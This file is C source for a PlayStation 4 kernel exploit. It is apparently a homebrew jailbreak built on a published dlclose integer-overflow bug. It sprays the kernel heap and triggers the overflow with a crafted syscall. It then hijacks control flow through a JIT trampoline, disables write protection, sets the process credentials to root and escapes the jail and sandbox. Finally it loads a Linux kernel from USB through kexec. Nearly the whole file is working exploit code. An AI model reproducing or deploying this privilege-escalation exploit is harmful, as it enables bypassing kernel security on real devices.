/*
	Code written based on info available here http://cturt.github.io/dlclose-overflow.html

	See attached LICENCE file
	Thanks to CTurt and qwertyoruiop

	- @kr105rlz
*/

#define DEBUG_SOCKET 1

#include "ps4.h"
#include "defines.h"

extern char kexec[];
extern unsigned kexec_size;

static int sock;

void usbthing();

void payload(struct knote *kn)
{
	struct thread *td;
	struct ucred *cred;

	// Get td pointer
	asm volatile("mov %0, %%gs:0" : "=r"(td));

	// Enable UART output
	uint16_t *securityflags = (uint16_t*)0xFFFFFFFF833242F6;
	*securityflags = *securityflags & ~(1 << 15); // bootparam_disable_console_output = 0

	// Print test message to the UART line
	printfkernel("\n\n\n\n\n\n\n\n\nHello from kernel :-)\n\n\n\n\n\n\n\n\n");

	// Disable write protection
	uint64_t cr0 = readCr0();
	writeCr0(cr0 & ~X86_CR0_WP);

	// Patch functions here if required

	// Restore write protection
	writeCr0(cr0);

	// Resolve creds
	cred = td->td_proc->p_ucred;

	// Escalate process to root
	cred->cr_uid = 0;
	cred->cr_ruid = 0;
	cred->cr_rgid = 0;
	cred->cr_groups[0] = 0;

	// Jailbreak ;)
	cred->cr_prison = (void *)0xFFFFFFFF83237250; //&prison0

	// Break out of the sandbox
	void *td_fdp = *(void **)(((char *)td->td_proc) + 72);
	uint64_t *td_fdp_fd_rdir = (uint64_t *)(((char *)td_fdp) + 24);
	uint64_t *td_fdp_fd_jdir = (uint64_t *)(((char *)td_fdp) + 32);
	uint64_t *rootvnode = (uint64_t *)0xFFFFFFFF832EF920;
	*td_fdp_fd_rdir = *rootvnode;
	*td_fdp_fd_jdir = *rootvnode;

	void *DT_HASH_SEGMENT = (void *)0xffffffff82200160;
	memcpy(DT_HASH_SEGMENT, kexec, kexec_size);

	void (*kexec_init)(void *, void *) = DT_HASH_SEGMENT;

	kexec_init((void*)0xFFFFFFFF8246E340, NULL);
}

// Perform kernel allocation aligned to 0x800 bytes
int kernelAllocation(size_t size, int fd) {
	SceKernelEqueue queue = 0;
	sceKernelCreateEqueue(&queue, "kexec");

	sceKernelAddReadEvent(queue, fd, 0, NULL);

	return queue;
}

void kernelFree(int allocation) {
	close(allocation);
}

void *exploitThread(void *none)
{
	printfsocket("[+] Entered exploitThread\n");

	// Calculate sizes for exploit
	uint64_t bufferSize = 0x8000;
	uint64_t overflowSize = 0x4000;
	uint64_t mappingSize = bufferSize + overflowSize;
	int64_t count = (0x100000000 + bufferSize) / 4;

	// Map address to control overflow later on
	uint8_t *mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	munmap(mapping + mappingSize, PAGE_SIZE);

	// Create structures
	struct knote kn;
	struct filterops fo;
	struct knote **overflow = (struct knote **)(mapping + bufferSize);
	overflow[2] = &kn;
	kn.kn_fop = &fo;

	// Setup trampoline to gracefully return to the calling thread
	void *trampw = NULL;
	void *trampe = NULL;
	int executableHandle;
	int writableHandle;
	uint8_t trampolinecode[] = {	0x58, // pop rax
					0x48, 0xB8, 0x19, 0x39, 0x40, 0x82, 0xFF, 0xFF, 0xFF, 0xFF, // movabs rax, 0xffffffff82403919
					0x50, // push rax
					0x48, 0xB8, 0xBE, 0xBA, 0xAD, 0xDE, 0xDE, 0xC0, 0xAD, 0xDE, // movabs rax, 0xdeadc0dedeadbabe
					0xFF, 0xE0 // jmp rax
	};

	// Get Jit memory
	sceKernelJitCreateSharedMemory(0, PAGE_SIZE, PROT_CPU_READ | PROT_CPU_WRITE | PROT_CPU_EXEC, &executableHandle);
	sceKernelJitCreateAliasOfSharedMemory(executableHandle, PROT_CPU_READ | PROT_CPU_WRITE, &writableHandle);

	// Map r+w & r+e
	trampe = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_EXEC, MAP_SHARED, executableHandle, 0);
	trampw = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_TYPE, writableHandle, 0);

	// Copy trampoline to allocated address
	memcpy(trampw, trampolinecode, sizeof(trampolinecode));	
	*(uint64_t*)(trampw + 14) = (uint64_t)payload;

	// Call trampoline when overflown
	fo.f_detach = trampe;

	// Start the exploit
	int sockets[0x2000];
	int allocation[50], m = 0, m2 = 0;
	int fd = (bufferSize - 0x800) / 8;

	printfsocket("[+] Creating %d sockets\n", fd);

	// Create sockets
	for(int i=0; i < 0x2000; i++) {
		sockets[i] = sceNetSocket("sss", AF_INET, SOCK_STREAM, 0);
		if(sockets[i] >= fd) {
			sockets[i+1] = -1;
			break;
		}
	}

	// Spray the heap
	for(int i=0; i < 50; i++) {
		allocation[i] = kernelAllocation(bufferSize, fd);
		printfsocket("[+] allocation = %llp\n", allocation[i]);
	}

	// Create hole for the system call's allocation
	m = kernelAllocation(bufferSize, fd);
	m2 = kernelAllocation(bufferSize, fd);
	kernelFree(m);

	// Close sockets
	for(int i=0; i < 0x2000; i++) {
		if(sockets[i] == -1)
			break;
		sceNetSocketClose(sockets[i]);
	}

	// Perform the overflow
	int result = syscall(597, 1, mapping, &count);
	printfsocket("[+] Result: %d\n", result);

	// Execute the payload
	printfsocket("[+] Freeing m2\n");
	kernelFree(m2);

	return NULL;
}

int _main(void) {
	ScePthread thread1;

	initKernel();	
	initLibc();
	initNetwork();
	initJIT();
	initPthread();

#if DEBUG_SOCKET
	struct sockaddr_in server;

	server.sin_len = sizeof(server);
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = IP(192, 168, 1, 129);
	server.sin_port = sceNetHtons(9023);
	memset(server.sin_zero, 0, sizeof(server.sin_zero));
	sock = sceNetSocket("debug", AF_INET, SOCK_STREAM, 0);
	sceNetConnect(sock, (struct sockaddr *)&server, sizeof(server));
	int flag = 1;
	sceNetSetsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char *)&flag, sizeof(int));
#endif

	printfsocket("[+] Starting...\n");
	printfsocket("[+] UID = %d\n", getuid());
	printfsocket("[+] GID = %d\n", getgid());

	// Create exploit thread
	if (scePthreadCreate(&thread1, NULL, exploitThread, NULL, "pthread_pene") != 0) {
		printfsocket("[+] pthread_create error\n");
		return 0;
	}

	// Wait for thread to exit
	scePthreadJoin(thread1, NULL);

	// At this point we should have root and jailbreak
	if(getuid() && getuid()) {
		printfsocket("[+] Kernel patch failed!\n");
		sceNetSocketClose(sock);
		return 1;
	}

	printfsocket("[+] Kernel patch success!\n");

	usbthing();

	printfsocket("[+] bye\n");
	sceNetSocketClose(sock);

	return 0;
}

void usbthing()
{
	// Open bzImage file from USB
	FILE *fkernel = fopen("/mnt/usb0/bzImage", "r");
	fseek(fkernel, 0L, SEEK_END);
	int kernelsize = ftell(fkernel);
	fseek(fkernel, 0L, SEEK_SET);

	// Open initramfs file from USB
	FILE *finitramfs = fopen("/mnt/usb0/initramfs.cpio.gz", "r");
	fseek(finitramfs, 0L, SEEK_END);
	int initramfssize = ftell(finitramfs);
	fseek(finitramfs, 0L, SEEK_SET);

	printfsocket("kernelsize = %d\n", kernelsize);
	printfsocket("initramfssize = %d\n", initramfssize);

	// Sanity checks
	if(kernelsize == 0 || initramfssize == 0) {
		printfsocket("no file error im dead");
		fclose(fkernel);
		fclose(finitramfs);
		return;
	}

	void *kernel, *initramfs;
	char *cmd_line = "panic=0 clocksource=tsc radeon.dpm=0 console=tty0 console=ttyS0,115200n8 "
			"console=uart8250,mmio32,0xd0340000 video=HDMI-A-1:1920x1080-24@60 "
			"consoleblank=0 net.ifnames=0 drm.debug=0";
	
	kernel = malloc(kernelsize);
	initramfs = malloc(initramfssize);

	printfsocket("kernel = %llp\n", kernel);
	printfsocket("initramfs = %llp\n", initramfs);

	fread(kernel, kernelsize, 1, fkernel);
	fread(initramfs, initramfssize, 1, finitramfs);

	fclose(fkernel);
	fclose(finitramfs);

	// Call sys_kexec
	syscall(153, kernel, kernelsize, initramfs, initramfssize, cmd_line);

	free(kernel);
	free(initramfs);

	// Reboot
	int evf = syscall(540, "SceSysCoreReboot");
	syscall(546, evf, 0x4000, 0);
	syscall(541, evf);
	syscall(37, 1, 30);
}
